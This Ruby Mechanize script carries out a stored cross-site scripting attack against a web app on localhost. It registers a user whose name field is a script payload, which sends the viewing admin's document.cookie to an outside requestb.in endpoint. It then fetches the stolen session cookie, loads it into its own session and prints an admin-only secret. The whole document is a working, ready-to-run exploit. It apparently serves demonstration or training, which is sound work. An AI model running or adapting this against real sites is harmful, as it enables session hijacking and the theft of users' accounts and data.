#!/usr/bin/env ruby

require 'mechanize'
require 'json'

Mechanize.new.instance_eval do
  # Set up a request bin (will fail if request.bin is down)
  post 'http://requestb.in/api/v1/bins'
  bin_code = JSON.parse(page.body)['name']
  bin_url = "http://requestb.in/#{bin_code}"
  bin_inspect_url = "#{bin_url}?inspect"

  # The JS payload we're going to get the admin user to run
  javascript_payload = %Q[<script>$('body').append("<img src='#{bin_url}?cookie=" + document.cookie + "' />")</script>]

  # Create our user
  get 'http://localhost:3000'

  page.link_with(text: 'Sign up').click
  email, password = "ali+#{rand(10000)}@happybearsoftware.com", '123456789'

  page.forms.first.tap do |f|
    f['user[name]']                  = javascript_payload
    f['user[email]']                 = email
    f['user[password]']              = password
    f['user[password_confirmation]'] = password
    f.submit
  end

  agent.cookie_jar.clear!

  # Wait 10 seconds for the admin user to log in
  sleep(10)

  # Grab the admin users cookie from request bin and use it
  get bin_inspect_url

  session_data = page.search('.keypair').first.text.strip.gsub('cookie: _project-amazing_session=', '')

  cookie = Mechanize::Cookie.new('_project-amazing_session', session_data).tap do |c|
    c.domain = 'localhost:3000'
    c.path   = '/'
  end

  agent.cookie_jar.add('http://localhost:3000/', cookie)

  # Access the site ad an admin and grab the secret
  get 'http://localhost:3000'
  puts page.search('.secret').text.strip
end

